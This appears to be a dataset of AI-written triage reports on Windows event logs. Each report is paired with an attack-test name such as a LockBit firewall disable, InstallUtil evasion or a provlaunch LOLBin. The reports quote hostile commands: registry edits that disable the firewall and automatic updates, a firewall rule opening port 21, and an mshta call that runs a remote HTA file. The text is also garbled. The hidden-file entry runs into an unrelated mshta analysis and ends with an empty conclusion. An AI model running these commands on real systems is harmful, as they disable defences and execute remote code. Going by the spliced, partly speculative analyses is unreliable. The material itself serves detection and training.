The PowerShell log combined with security logs depicting special privileges and process creations via Sysmon strongly indicate potential malicious activity. The specific registry manipulation attempts reflect a well-known UAC bypass exploit technique, making these activities highly suspect.

**Resolution: MALICIOUS**

Given the detailed patterns observed, especially the attempts to utilize UAC bypass mechanisms and the sequence of process creations observed in Sysmon, this event activity is flagged as malicious. Immediate actions are recommended to:
1. Isolate the affected machine.
2. Conduct a full forensic investigation to trace the origins and impact.
3. Evaluate any security patches or mitigations required to disable any vulnerable services or configurations.
4. Educate users on avoiding the execution of untrusted PowerShell scripts.

**Guidance:**

This incident requires prompt attention and remediation measures to prevent further exploitation and to identify any additional compromised systems or data exfiltrations associated with this behavioral pattern."
Lolbin Jsc.exe compile javascript to exe,"### Detailed Analysis of the Logs

#### System Log and Security Log Analysis
1. **Time Change Events**: 
   - There are records indicating changes in the system time. The events in the Security log (EventID: 4616) and System log (EventID: 1 from Microsoft-Windows-Kernel-General) show changes in system time initiated by `svchost.exe` under the `LOCAL SERVICE` account.
   - **Assessment**: Time change events can be legitimate due to synchronization with an NTP server or daylight savings adjustments. However, unauthorized time changes may indicate an adversary's attempt to modify the timeline of system events.

2. **NTP Synchronization**:
   - EventID: 35 from Microsoft-Windows-Time-Service confirms that the system time was synchronized with an NTP server (`time.windows.com`), which may explain the time change.

#### Sysmon Log Analysis
1. **Process Execution**:
   - Multiple process executions are captured: `powershell.exe`, `cmd.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and them being initiated by `admin_test` user.
   - Notably, `cmd.exe` is executed with parameters to compile a JavaScript file using `jsc.exe` (`CommandLine: ""cmd.exe"" /c copy... & C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe`).
   - Executions of `HOSTNAME.EXE`, `whoami.exe`, and `wevtutil.exe` are somewhat frequent by `admin_test`.

2. **Process Chains**:
   - The logs indicate a sequence of process creations, possibly related to scripting or programming tasks (e.g., compiling with `jsc.exe`), which is not inherently malicious but unusual if not expected for a CEO’s machine. It implies possible automated or scripted actions.
   
#### Indicators and Findings
- **Scripting Activity**: The activity involving the JavaScript compilation and the use of `cmd.exe` to manipulate files hint at automated or scripting-related tasks, which can sometimes be indicative of malicious activity.
- **Frequent Execution of Administrative Utilities**: The executions of `whoami`, `hostname`, `conhost`, and `wevtutil` are indicators that might suggest an exploration or reconnaissance within the system.
- **User Account Utilization**: All suspicious activities are performed under the `SERVER002\\admin_test` user, indicating this user's session or credentials might be utilized for potentially unauthorized activities.

### Assessment and Recommendations
1. **Assessment**: The evidence suggests suspicious scripting and reconnaissance activities potentially occurring on the host, especially if such activities are unexpected for a CEO's workstation.
   - The frequent usage of `cmd.exe` with scripting tools and reconnaissance utilities is atypical if not associated with legitimate IT or administrative maintenance tasks.

2. **Recommendations**:
   - Conduct further investigation into the context and necessity of these activities. Verify if the `admin_test` account was authorized or expected to perform such actions.
   - Verify logs for additional periods to assess the continuity or pattern of this behavior.
   - Review the security posture of `admin_test` account, ensuring it follows the principle of least privilege.
   - Consider a detailed threat hunt in the environment to ensure no other systems show similar patterns.

### Resolution
- **SUSPICIOUS**: The logs reveal potentially suspicious activity that warrants further investigation to rule out any malicious intent.
"
Disable Windows CMD application,"Upon analyzing the provided Windows event logs, several observations and considerations can be made:

### Observations:

1. **PowerShell Activity:**
   - There is a notable PowerShell command executed: `powershell.exe & {New-ItemProperty -Path ""HKCU:\Software\Policies\Microsoft\Windows\System"" -Name DisableCMD -Value 1}`. This command modifies the registry to disable the command prompt, which can be indicative of an attempt to restrict user access or modify system behavior for malicious purposes.

2. **Whoami.exe and Hostname.exe Executions:**
   - Multiple instances of `whoami.exe` and `hostname.exe` are executed. These could potentially be benign; however, frequent and automated execution could indicate an attacker verifying system identity and user context.

3. **Wevtutil.exe Executions:**
   - `wevtutil.exe` is a utility for managing Windows event logs. Its repeated invocation might suggest log manipulation attempts to cover tracks.

4. **System and Security Logs:**
   - No highly suspicious entries in security or system logs that directly indicate unauthorized access or privilege escalation at a high administrative level.
   - The time discrepancy observed in the `EventID: 1` from Kernel-General (system logs) suggests potential tampering or system adjustments, but the exact impact requires further correlation with other events.

5. **Edge Updates Activity:**
   - Numerous entries related to Microsoft Edge Update processes are observed. These appear to be normal system update activities, as they are signed by Microsoft Corporation and related to software updates and registration.

### Assessment:
Based on the analysis, the repeated execution of PowerShell scripts to modify registry settings, particularly those that disable the command prompt, is suspicious. While the other activities (system and application logs related to Edge updates) appear to be routine, the PowerShell command presents a potential indicator of malicious intent or preparatory steps towards restricting system usability or enforcing policy changes on the host.

### Threats or Risks Identified:
1. **Registry Manipulation Risk:**
   - Unauthorized registry changes through PowerShell could support further malicious activity or disrupt normal operations (e.g., disabling command prompt access).

2. **Potential Log Tampering:**
   - Given the use of `wevtutil.exe`, there might be an attempt to obfuscate or clear event logs, though further evidence would be needed for confirmation.

### Guidance on How to Proceed:
- **Immediate Investigation:**
  - Investigate the origin and intent of the PowerShell script. Check for unauthorized access or lateral movement indicators.
  
- **System Auditing:**
  - Review system policies and user permissions to secure against such changes.
  
- **Threat Hunt:**
  - Cross-reference these activities with network logs, if available, for potential indicators of compromise.

- **Containment:**
  - If confirmed unauthorized, isolate the machine for forensic investigation to prevent potential adversarial maneuvers within the environment.

### Final Resolution:
**SUSPICIOUS**

The logs reflect activity that raises concerns and warrants further investigation to determine the motive and scope of potential compromise."
LockBit Black - Disable Privacy Settings Experience Using Registry -cmd,"Upon reviewing the provided Windows event logs, I have identified some key observations:

1. **Time Change Events** (EventID 4616 and 1 in Security and System logs, respectively):
   - There are multiple instances of event logs related to system time change, executed by the process `svchost.exe` with `LOCAL SERVICE` and `NT AUTHORITY\SYSTEM` privileges. While time changes can be legitimate (e.g., for time synchronization), it can also be used by attackers to cover their tracks or to synchronize with other malicious activities.

2. **Suspect Process Execution** (Sysmon logs):
   - Multiple instances of `wevtutil.exe` and `conhost.exe` being executed by a user `admin_test`. `wevtutil.exe` is typically used to query or clear event logs, which might indicate potential log tampering.
   - Execution of `cmd.exe` with command-line argument to modify the registry (`reg add ""HKCU\Software\Policies\Microsoft\Windows\OOBE""`). Registry modifications can be indicative of an attempt to alter system configurations potentially for persistence or configuration changes.
   - The `whoami.exe` is used which is harmless on its own, but given the context, it may relate to reconnaissance or confirmation of user privileges post-compromise.

3. **EdgeUpdate Activity** (Sysmon logs):
   - The repetitive activity and service start-stop logs of `MicrosoftEdgeUpdate.exe` indicate it is likely running updates for Microsoft Edge. These appear to be benign, aligned with normal update activities.

4. **Unusual Process Executions**:
   - The execution and repetitive pattern of processes with elevated integrity levels (as seen with entries for `cmd.exe`, `reg.exe`, `MicrosoftEdgeUpdate.exe`) suggest a level of access and persistence techniques which need further investigation.

5. **Overall Analysis**:
   - The combination of legitimate tools (`svchost.exe`, `wevtutil.exe`, `cmd.exe`) being possibly leveraged for suspicious activities is indicative of tactics used in attacks.
   - The presence of potentially anomalous time changes, registry modifications, and use of tools such as `wevtutil.exe` can suggest suspicious activities not typical in daily operations.

**Resolution: SUSPICIOUS**

Considering the above evidence of unusual process executions, registry modifications, frequent service start-stop events, and time change anomalies, the activity appears suspicious. It warrants further investigation to determine whether these actions are part of legitimate administrative tasks or indicative of a potential compromise. 

**Guidance on How to Proceed**:
- Immediately conduct a more in-depth forensic review of the system for any further signs of compromise.
- Analyze the intent of registry changes and the context of time modifications.
- Review user activity for `admin_test` to understand the nature and pattern of process executions.
- Cross-reference these events with network logs or other system logs for corroborating activities.
- Implement additional monitoring and potentially isolate the machine for further analysis."
LockBit Black - Unusual Windows firewall registry modification -cmd,"### Analysis of Windows Event Logs

#### Observations:
1. **Repeated Wevtutil and Conhost Executions**:
   - Numerous instances of `wevtutil.exe` and `conhost.exe` executions by the `SERVER002\admin_test` user are recorded. These processes are typically associated with event log management and console applications.

2. **Hostname and Whoami Executions**:
   - The `hostname.exe` and `whoami.exe` processes are executed, which may be used for routine administrative tasks, although excessive or unexpected occurrences might be suspicious.

3. **Firewall Configuration Changes via CMD**:
   - A `cmd.exe` process with a command modifying Windows Firewall settings is observed. It disables the firewall via registry modifications:
     ```
     reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f
     reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f
     ```
   - This command is deeply concerning, as disabling the firewall is a common action during cyber-attacks to facilitate lateral movement or data exfiltration.

4. **Microsoft Edge Updates**:
   - There are multiple events pertaining to Microsoft Edge updates and registration processes. These updates are being executed under the `NT AUTHORITY\SYSTEM` context and appear legitimate as they detail standard update procedures for Edge.

5. **Privilege Assignments**:
   - The user `admin_test` has been granted several high-privilege rights, including `SeDebugPrivilege`, `SeRestorePrivilege`, and others. This can pose a security risk if the account is compromised.

#### Risk Assessment:
The execution of commands to deactivate firewall settings directly indicates an attempt to alter the system's security posture, which is a clear indicator of malicious or unauthorized activity. Combined with the high-level privileges of the executing account (`admin_test`), it presents a significant risk of potential compromise.

#### Recommendations:
1. **Immediate Action**: 
   - Investigate the rationale behind the firewall policy changes. If unauthorized, reverse these changes immediately and strengthen monitoring of similar activities.
   
2. **Access and Privilege Review**:
   - Assess whether the privileges assigned to the `admin_test` user are appropriate. Consider reducing privileges if feasible, aligning with the principle of least privilege.

3. **Audit and Monitor**:
   - Enhance logging and alerting mechanisms for security-critical changes such as firewall settings and privilege assignments.
   - Check network logs for any suspicious inbound or outbound connections following the firewall changes, indicating potential data exfiltration or lateral movement.

4. **User Awareness and Policy**:
   - Ensure that relevant personnel are aware of acceptable administrative actions and reinforce security policies to prevent intentional or accidental changes that compromise security.

Given these findings, the overall assessment for the provided logs is: **MALICIOUS**. Immediate remediation steps are necessary to address the identified threats and prevent potential security incidents."
InstallUtil evasive invocation,"### Analysis Summary

Upon reviewing the Sysmon, Application, PowerShell, and Security logs provided, the activity points to potentially suspicious or malicious behavior. Here is the breakdown of the behavior that was noted:

1. **Suspicious PowerShell Activity:**
   - Multiple instances of PowerShell were executed with scripts originating from a temporary location (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\...`). This specific activity involved the use of an evasive script, showing attempts to copy `InstallUtil.exe` disguised as `notepad.exe` to another location (`$Env:windir\\System32\\Tasks\\notepad.exe`). This is a known technique often used by malicious actors to leverage trusted utilities for malicious purposes, often referred to as ""Living off the Land"" (LotL) tactics.
   - The PowerShell command includes calls to `Invoke-BuildAndInvokeInstallUtilAssembly` which implies an attempt to execute arbitrary code.

2. **Execution of Unusual Processes:**
   - There are processes such as `wevtutil.exe`, `csc.exe`, and `cvtres.exe` being executed multiple times in coordination with the suspicious PowerShell execution. These processes are often involved in clearing event logs, compiling code, or other tasks that are used in post-exploitation scenarios.

3. **Privileges and Elevated Tokens:**
   - Several events show that processes are executed with high integrity levels, indicating administrative privileges. This includes the impersonation of SYSTEM level. The elevated privileges combined with the actions taken by PowerShell suggest potential privilege escalation or at a minimum, administrative privilege exploitation.

4. **Use of Microsoft Edge Update Processes:**
   - Multiple Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) executions were noticed, which, while they can be legitimate, malware could impersonate or hijack these processes for persistence or evasion.

### Final Assessment

Given the identified patterns involving suspicious PowerShell script usage and potential attempts to disguise malicious activities using trusted system utilities, the situation exhibits signs of potential malicious activity.

### Resolution: **MALICIOUS**

### Guidance on How to Proceed

1. **Isolate the Host:**
   - Immediately isolate the host from the network to prevent potential lateral movement or further data exfiltration.

2. **Conduct a Thorough Forensic Investigation:**
   - Analyze the contents of the PowerShell scripts found in temporary directories and check for additional scripts or compiled binaries that may have been created or executed.
   - Review and secure user accounts with excessive privileges and monitor for unauthorized changes.

3. **Examine Network Traffic:**
   - Investigate network logs for any unusual outbound connections from this host which could indicate data exfiltration or communication with a command and control (C2) server.

4. **Reset Credentials:**
   - Reset credentials for accounts that were logged in during the affected period, especially those with administrative rights.

5. **Enhance Monitoring:**
   - Implement additional monitoring on other critical systems to identify signs of similar activities or lateral movement.

6. **Patch and Review Security Posture:**
   - Ensure all systems are fully updated with the latest security patches and review the overall security posture to prevent similar activities in the future.
  
This incident requires coordinated remediation efforts to secure the environment against further exploitation."
Snake Malware Encrypted crmlog file,"Upon reviewing the provided Sysmon, PowerShell, System, and Security logs, the following observations and analyses have been derived:

### Suspicious or Anomalous Behavior:

1. **Repeated Execution of `whoami.exe`, `conhost.exe`, and `wevtutil.exe`**:
   - The processes `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are executed multiple times within a very short time frame by the user `SERVER002\\admin_test`. While the use of `whoami.exe` on its own is benign, repeated execution in conjunction with these particular executables can be a part of nefarious activity such as enumeration, privilege escalation, or events clearing attempts.

2. **Unusual PowerShell Activity**:
   - The execution of a PowerShell command was observed which creates a file with specific attributes (`Hidden`, `System`, `Archive`) in the Windows directory. The filepath creation `$env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog` and hiding it is indicative of an attempt to obfuscate activity or data storage.
   - PowerShell scripts that manipulate system or hidden files in this manner can be associated with malicious activity.

3. **Execution of High Integrity Level Processes**:
   - A high number of processes executed under high integrity level by the same user are visible in the logs, indicating potential attempts to take advantage of elevated privileges for suspicious reasons.

### Indicators of Malicious Activity or Compromise:

- The use of `wevtutil.exe` in particular can be alarming as it can be used to clear event logs, a known tactic to cover up malicious activity.
- The PowerShell script interacting with system directories in a hidden manner aligns with techniques used in malware propagation or data exfiltration scenarios.

### Assessment:

Combining the repetitive and clustered execution patterns of system utilities typically leveraged in post-exploitation activities, along with the PowerShell script writing hidden system files, strongly suggests that these logs exhibit activity that needs further investigation.

### Resolution:

- **SUSPICIOUS**: The activity observed in the logs doesn’t conclusively prove malicious intent but contains several indicators that suggest further investigation and monitoring are warranted. This is due to the unusual process executions and the nature of the PowerShell activity that signed of potential compromise needs to be comprehensively analyzed.

### Guidance:

1. **Immediate Actions:**
   - Conduct a detailed forensic analysis on `Server002` to determine if there is unauthorized access or persistence mechanisms in place.
   - Review user activities, particularly for `admin_test`, for any out-of-ordinary behavior or unauthorized access logs.
   - Verify file integrity and permissions in the Windows directory where the PowerShell script writes the file.

2. **Monitoring and Preventive Measures:**
   - Implement enhanced monitoring for the execution of `whoami.exe`, `wevtutil.exe`, and PowerShell across the network, focusing on high-frequency access patterns.
   - Use alerting mechanisms for PowerShell commands involving hidden or system attribute changes in sensitive directories.

3. **Further Investigation:**
   - Analyze the context around the parent processes involved in these executions, and cross-reference them with known threat intelligence databases to confirm any matches with known malicious activities."
Set a firewall rule using New-NetFirewallRule,"Upon carefully analyzing the provided event logs for the Windows host, I have identified several points of interest that may indicate suspicious or potentially malicious activity:

1. **Time Changes**:
   - There are multiple entries where the system time was altered. For example, the timestamp was changed from ""2024-10-28 12:05:59"" to ""2024-10-28 12:05:53"" which often can indicate an attempt to manipulate logs or confuse the system. However, this alone does not confirm malicious activity as it might be part of regular synchronizations or daylight savings adjustments.

2. **Suspicious PowerShell Activity**:
   - A PowerShell command was executed to create a new inbound firewall rule allowing traffic on port 21, used for FTP. The command is: `powershell.exe & {New-NetFirewallRule -DisplayName ""New rule"" -Direction ""Inbound"" -LocalPort ""21"" -Protocol ""TCP"" -Action ""allow""}`. This is suspicious as it modifies firewall configurations and could potentially be used to create unauthorized access or facilitate lateral movement within the network.

3. **Process Execution and Frequency**:
   - The `wevtutil.exe` process was triggered several times in short succession. While typically used for managing Windows event logs, frequent calls in a short period might be a technique to query or tamper with logs maliciously. 
   - The processes `whoami.exe` and `hostname.exe` executed, potentially used to gain information about the system identity and user context.

4. **Edge Update Executions**:
   - The event logs have numerous entries related to Microsoft Edge Update processes, including installation and updates (`MicrosoftEdgeUpdate.exe`). While this could be routine, the density and frequency of executions should be verified against expected update schedules to rule out any misuse.
   
**Assessment and Resolution**:
The logs contain several instances of potentially concerning activities, particularly the unauthorized PowerShell command and frequent execution of event log-related processes. 

**Resolution: SUSPICIOUS**

**Next Steps**:
- **Detailed Investigation**: Conduct a focused forensic analysis of the CEO's machine to capture more context about these activities, especially focusing on why the PowerShell script was executed and by whom.
- **Review Firewall Configurations**: Verify and audit current firewall rules to ensure no unauthorized changes align with the PowerShell command observed.
- **User Interviews**: Check for any legitimate reason or authorization from administrators for these activities, especially the PowerShell execution.
- **Correlation with other logs**: See if this activity correlates with other network or security incidents in the organization.
- **Monitor and Alert**: Enhance monitoring for similar PowerShell commands and any activity on critical ports such as 21 (FTP).

This situation requires vigilance and further examination to either confirm benign intent or escalate to a security incident."
Disable Windows OS Auto Update,"After reviewing the provided logs, here is the analysis of the entries across various log channels:

### Application Log
- **Software Protection Platform Service**: The events related to the Software Protection Platform Service logs are of a routine nature and do not indicate any suspicious activity.
- **Edge Update Stopped**: The logs show that the EdgeUpdate service was stopped twice. This could be a part of system updates or maintenance activities. However, if unexpected, it might warrant further inquiry.

### System Log
- **Time Change Events**: Multiple events indicate a time change executed by `svchost.exe`. While these changes are typically legitimate (for instance, correcting time drift), it merits attention if unexpected or frequently altered over a short period.

### Sysmon Log
- **Command Executions by `admin_test` on svchost, wevtutil, conhost, whoami, cmd, and reg**:
  - The `wevtutil.exe` and `conhost.exe` executions logged under `admin_test` don't appear suspicious in isolation. These tools have legitimate uses, but their clustered appearances might be part of a larger automation or script.
  - Execution of `cmd.exe` with a command modifying Windows Update settings (`cmd.exe /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1 /f`) is a configuration change that might indicate policy enforcement or an attempt to disable automatic updates. This warrants further investigation.

### EdgeUpdate Activity
- Multiple entries indicate the normal operation of Microsoft Edge updates, including setup and service runs. The series of `MicrosoftEdgeUpdate.exe` processes run under `NT AUTHORITY\SYSTEM` authority reflect typical update procedures.
- **Note**: The presence of `MicrosoftEdgeUpdate.exe` activity is extensive but consistent with software updates.

### Security Log
- **Time Change Confirmation**: Events 4616 confirm time changes initiated by `LOCAL SERVICE`, re-confirming the consistency with system service operations that adjusted the system time.

### Key Suspicious Activity
- The action where `cmd.exe` was used to add a registry entry could imply an intent to alter system behavior, specifically disabling automatic Windows updates.
- Regular uses of `whoami.exe` suggest introspection by a user (`admin_test`) that might be benign but recurrent use can be flagged for potential privilege reconnaissance.

### Conclusion
The logs reflect a mix of benign operations like scheduled updates and system services. However, there is a `cmd.exe` operation modifying the Windows Update configuration and several instances of potentially benign utilities like `whoami` and `wevtutil` that could warrant closer inspection in the context of any other suspicious activities usually associated with compromised systems.

### Resolution
**SUSPICIOUS**

While most activity can be considered typical for update processes and may be benign, the registry change regarding Windows Update settings, combined with unusually clustered command executions, flag a need for additional investigation to rule out misuse under privileged user accounts or unauthorized configuration changes.

### Guidance
- Verify with the IT team if the changes to the Windows Update settings are authorized and document any scripts or maintenance routines performed.
- Check the context of the `admin_test` user activity for authorization compatibility and any unusual behavior patterns.
- Monitor for continued exploitation attempts or configuration changes that align with disabling security postures of the system."
Windows Add Registry Value to Load Service in Safe Mode with Network,"### Analysis of the Provided Logs

Upon reviewing the sysmon, system, security, application, and PowerShell logs, a few activities stand out that require careful examination:

1. **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
   - The logs show multiple executions of `wevtutil.exe` and `conhost.exe` processes by the user `SERVER002\admin_test`. This pattern can be typical in automated scripts or batch processing scenarios. However, they should be checked for associated command-line arguments and context to ensure no illicit access to event logs or command execution.

2. **Process Chain with `cmd.exe`, `reg.exe`, and Registry Changes:**
   - A command-line entry (`""cmd.exe"" /c REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\fileSafeMode"" /VE /T REG_SZ /F /D ""Service""`), executed by `cmd.exe`, indicates a modification to the Windows registry, specifically related to SafeBoot configurations. This is potentially suspicious, as changes to SafeBoot can be used to alter system startup behavior potentially for malicious purposes.

3. **Use of `whoami.exe` and `hostname.exe`:**
   - Although these utilities are used frequently for gathering system and user information, their execution should be investigated further to determine if they were used legitimately or as part of a reconnaissance step by a malicious actor.

4. **Time Manipulation Events:**
   - The system logs indicate time changes by the `svchost.exe` process. Time manipulation can be used for covering tracks; however, there is no direct indication here of malicious activity beyond the service's action.

5. **Microsoft Edge Update Process Activity:**
   - Activity around `MicrosoftEdgeUpdate.exe` and related components could signify legitimate software updates. However, the presence of multiple similar process executions with varying command-line arguments and temporary directories should be confirmed with software update documentation from Microsoft to ensure it aligns with expected behavior.

### Assessment of Malicious Activity

Based on the provided logs and the analysis:

- **Indicators of Suspected Malicious Activity:**
  - Registry modification via `reg.exe` to change SafeBoot configurations, which could potentially allow unauthorized control over the boot process in network Safe Mode, is highly unusual and suggests unauthorized changes or misconfigurations.

- **Lack of Clear Malicious Activity in Other Areas:**
  - The frequent process creation of `wevtutil.exe`, `conhost.exe`, and Microsoft Edge updating processes, while noteworthy, are not definitively malicious on their own and require contextual scan or malware analysis confirmation.

### Resolution

- **Resolution**: **SUSPICIOUS**
  - The logs contain entries that warrant further investigation, particularly the registry modification command and the context in which these processes were invoked. Further steps are needed to clarify the intent and legitimacy of these actions, potentially involving forensic analysis of artifacts related to these processes or enhancing active monitoring for similar activities on the host.

### Guidance on How to Proceed

1. **Conduct a Malware Scan**: Perform a comprehensive malware scan on the host to check for any persistent threats or anomalies related to these processes.
2. **Review User Activities and Permissions**: Analyze user `admin_test` activities in more depth, including their access logs and permissions, to ascertain if there has been unauthorized access or escalation.
3. **Investigate Edge Update Entries**: Check with Microsoft resources to confirm the legitimacy and typical expected behavior of Edge update processes corresponding to the logs.
4. **Log Review for Context and Patterns**: Cross-reference these logs with any incident detection systems in place to spot any correlating alerts or patterns indicating broader activity.
5. **Implement Enhanced Monitoring and Alerts**: Set up alerts for similar suspicious registry changes and unusual process executions to detect and prevent potential compromises proactively."
Create Windows Hidden File with powershell,"### Detailed Analysis of the Logs

Upon examining the provided logs, several events stand out as potential indicators of suspicious or malicious activity, particularly involving the use of command line interfaces and PowerShell scripts. Below is a breakdown of the observed activities:

#### 1. **Sysmon Log Activities**
- **Repeated Command-Line Executions:**
  - Multiple instances of `cmd.exe` were spawned with conditional command-line executions such as `IF EXIST %temp%\data.txt` and `echo system_Attrib_data >> %temp%\data.txt`.
  - **Potential Risk:** These command sequences suggest checks for the existence of a specific file and writing to a file, which could be scripts intended for reconnaissance or persistence mechanisms.

- **Use of `wevtutil.exe`:**
  - Several instances of `wevtutil.exe`, a tool that can be used to manage event logs, were observed.
  - **Potential Risk:** The use of this tool might be involved in tampering or clearing event logs to cover tracks, which is typically a behavior associated with attempts to hide malicious activity.

- **Execution of `hostname.exe` and `whoami.exe`:**
  - Execution of `hostname.exe` and `whoami.exe` indicates attempts to gather system information and identify user context, which might be part of an adversary's reconnaissance phase.

- **PowerShell Execution with Hidden Attribute Setting:**
  - The PowerShell command attempts to modify file attributes, setting them as hidden using `$file.attributes='Hidden'` for `data.txt`.
  - **Potential Risk:** This action is often used to conceal files from typical user access, indicative of an attempt to obfuscate the presence of certain files, a common tactic in malware operations.

#### 2. **Windows PowerShell Logs**
- **Registry and Environment Changes Started:**
  - The sequence of PowerShell events shows the initialization of various providers (Registry, Alias, Environment) indicating a script or module initialization that interacts with the system environment.

#### 3. **Associated Risks**
- The combination of these tools and commands, especially with high integrity levels and executed by an admin user (`SERVER002\admin_test`), suggests elevated privileges that could be leveraged for unauthorized tasks or to maintain persistence.

### Assessment of the Situation
Given the evidence, the sequence of redundant process executions, conditional file operations via command line, event log handling with `wevtutil.exe`, system info gathering, and file attribute modifications, the activity identified within these logs is highly indicative of suspicious behavior warranting further investigation.

   - The logs show PowerShell execution with the specific command: `{Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/file/file-file/24549e3866407c3080b95b6afebf78e8acd23352/files/data.005/src/data.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe}`. This command attempts to execute a script hosted on a remote GitHub repository using `mshta.exe`.
   - `mshta.exe` is a legitimate Windows utility that can execute HTA (HTML Application) files, but it is frequently used by attackers to bypass security controls and execute malicious scripts by fetching them from remote sources.

2. **Sysmon Events:**
   - Multiple Sysmon logs trace the execution of `powershell.exe` initiated by `wsmprovhost.exe` with high integrity levels, indicating that the process might have run with administrative privileges.
   - The presence of `Invoke-ATHHTMLApplication` and a URL fetched via `mshta.exe` points towards a potential script execution that could be part of a malicious campaign or lateral movement.

3. **Indicators of Possible Remote Code Execution:**
   - The specific use of `Invoke-ATHHTMLApplication` combined with fetching an online HTA file and executing it using `mshta.exe` is a highly suspicious behavior aligned with many known attack vectors leveraging PowerShell for code execution, often seen in phishing or spear-phishing attempts.

### Assessment and Risk

The logs suggest there is a strong indicator of malicious activity:

- **Threats**: Use of remote scripts via `mshta.exe`, executing with elevated privileges, and PowerShell's execution policy potentially bypassed.
- **Risks**: Potential compromise of the CEO's machine, data exfiltration, or system compromise leading to broader network exposure.

### Guidance on How to Proceed

1. **Immediate Isolation**: Temporarily isolate the concerned host (`Server002`) from the network to prevent potential lateral spread or communication with the attacker's infrastructure.
2. **Further Investigation**:
   - Retrieve the referenced HTA file from `raw.githubusercontent.com` to analyze its content for malicious payload or behavior.
   - Conduct a thorough audit of invoked scripts and commands on the host machine to track other potentially unauthorized activities.
   - Use network monitoring tools to look for any suspicious outbound connections, indicating data exfiltration.
3. **Incident Response**: Engage the incident response team to perform an in-depth forensic analysis and review the entire network for similar indicators of compromise.
4. **Mitigation Strategies**:
   - Adjust PowerShell execution policies.
   - Disable or restrict `mshta.exe` usage if not required for business operations.
   - Strengthen email and web filtering to block phishing attempts that might lead to such payloads being executed.

### Conclusion

Provlaunch.exe Executes Arbitrary Command via Registry Key,"Based on the provided logs, let's break down the various activities and identify any suspicious or malicious behavior.

### Application Log
- **edgeupdate Service Stopping:** 
  - Seen multiple times with a short gap. This could be part of a normal update or an intentional service restart. The service in question is related to Microsoft Edge, which is legitimate software.

### Sysmon Log
- **Process Executions by `admin_test`:**
  - **`wevtutil.exe`** and **`conhost.exe`** are run several times by `SERVER002\admin_test`. These are normal Windows utilities. However, frequent execution might suggest log manipulation activities, particularly with `wevtutil.exe`, commonly used for dumping or clearing event logs.
- **Command Prompt (cmd.exe) with Registry Modification:**
  - The command `cmd.exe /c reg.exe add...` includes registry modifications to add dummy registry keys and execute `provlaunch.exe` with `calc.exe`.
  - This command is suspicious and indicative of potential attempt to execute a Living Off the Land Binary (LOLBin). These are legitimate binaries used for malicious purposes, here possibly trying to execute or hide malicious activities using `calc.exe`.

### Security Log
- **Time Change Event (EventID 4616):**
  - There are events indicating changes in system time around the same timestamp when the suspicious registry activities occurred. Time changes can be used to alter timestamps and potentially hide activities. However, these can also happen during legitimate operations.

### System Log
- **System Time Change:**
  - Corresponds with the security log's time change, again possibly benign system operations or intentional manipulation.

### Edge Update Activity
- The logs show extensive Edge Update activities, which are consistent with an automated background process updating the software. However, this overlaps with the suspicious activity around registry modification.

## Assessment
- **Suspicious Behavior:**
  - The use of `cmd.exe` to modify the registry is suspicious, moving this activity towards a potential compromise.
  - Multiple executions of legitimate utilities (`wevtutil.exe`, `conhost.exe`) under `admin_test` might indicate a potential for attempts at covering tracks.
  - The time change events may correlate with the suspicious registry changes, pointing towards possible attempts to obfuscate system logs.

## Conclusion
The activities observed in the logs display behaviors that could be indicative of malicious intent, particularly the registry modifications and possible techniques to mask activities. However, without further context, these could also be a non-malicious use of powerful admin tools and domain activities.

## Resolution
- **SUSPICIOUS**: The behavior suggests potential malicious activity that seeks further investigation to confirm if it's benign or a precursor to a compromise.

### Guidance
1. **Investigate the `admin_test` user account** for unusual activity in other logs or systems.
2. **Correlate with network logs** around the same time for anomalous outbound connections.
3. Review the use of `wevtutil.exe` and any discrepancies in event logs that suggest tampering.
4. Examine further for any signs of persistence mechanisms or additional LOLBins.

A proactive investigation around the above points can help ensure whether there is an actual security threat or confirm benign activity."
Lolbin Gpscript startup option,"Upon analyzing the provided Windows event logs, several events stand out as potentially suspicious or problematic. Below is a detailed analysis of these observations:

### Detailed Analysis

1. **Time Manipulation Events**:
   - The security logs show Event ID 4616 indicating a change in system time by the process `svchost.exe`. Altering system time can be used to mask events or confuse timeline investigations as a part of malicious activity. 

2. **Usage of `wevtutil.exe` and `cmd.exe`**:
   - Multiple executions of `wevtutil.exe` and `cmd.exe` with a command line referencing `Gpscript /startup`. `wevtutil.exe` can be used to export, archive, and clear event logs, which is often used by attackers to cover their tracks. The `cmd.exe` launch with `Gpscript` suggests potential Group Policy scripts being executed, which might indicate an attempt to execute malicious scripts using system's capabilities.

3. **Command Line Operations with `PowerShell` and `whoami.exe`**:
   - The presence of `whoami.exe` run under the context of `admin_test` might be a benign check for identifying user contexts but could also be used by attackers to understand the privileges they have obtained. 

4. **General Environment**:
   - Numerous activities related to Microsoft Edge Update, including processes running as `SYSTEM` user, could be interpreted as routine updates, although they seem disproportionately frequent. No clear direct malicious indicators are associated with these events from the logs.

### Potential Indicators of Compromise

- **Time Manipulation**: The intentional alteration of the system time by `svchost.exe` is unusual and suggests attempted obfuscation.
- **Process and Service Manipulation**: The creation and stopping of numerous Edge update and Event utility processes show abnormal usage that aligns with potential elements of an uninstall or configuration modification attack.

### Assessment and Resolution

Based on the information, the investigation concludes:

- **Suspicious Activity**: The alteration of system time and usage of command-line tools like `wevtutil.exe` and `cmd.exe` are classical suspicious activities. The intense number of Edge Update process events could also be indicative of something beyond a typical update cycle, though some noise may be expected. Thus, deeper examination is warranted, especially surrounding the `GPScript` context.

### Recommended Next Steps

1. **Deep Log Analysis**: Perform a comprehensive review of past logs for similar patterns to establish if this is an isolated incident or part of a recurring issue.

2. **System Audit**: Evaluate if privilege escalation has occurred and if the `admin_test` account has been compromised.

